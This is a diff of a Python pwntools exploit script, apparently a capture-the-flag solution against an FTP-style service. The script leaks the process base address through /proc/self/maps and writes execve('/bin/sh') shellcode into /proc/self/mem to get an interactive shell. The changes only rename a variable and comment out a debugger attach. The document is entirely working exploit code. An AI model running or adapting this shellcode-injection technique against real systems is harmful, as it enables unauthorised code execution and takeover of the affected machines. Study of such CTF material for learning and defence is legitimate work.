@@ -24,12 +24,11 @@ def write(name, offset, length, content):
 def exp():
     io.sendlineafter("请登录FTP:", "m4x")
     read("/proc/self/maps", 0, 0x100)
-    base_addr = int(io.recvuntil("-", drop = True), 16)
-    info("base_addr -> 0x%x" % base_addr)
-    gdb.attach(io, "b *{} + 0x10C8\nc".format(base_addr))
-    address = base_addr + 0x1154
+    base = int(io.recvuntil("-", drop = True), 16)
+    info("base -> 0x%x" % base)
+    #  gdb.attach(io, "b *{} + 0x10C8\nc".format(base))
     shellcode = asm(shellcraft.execve("/bin/sh"))
-    write("/proc/self/mem", address, 0x100, shellcode)
+    write("/proc/self/mem", base + 0x1154, 0x100, shellcode)
 
     io.interactive()
     io.close()
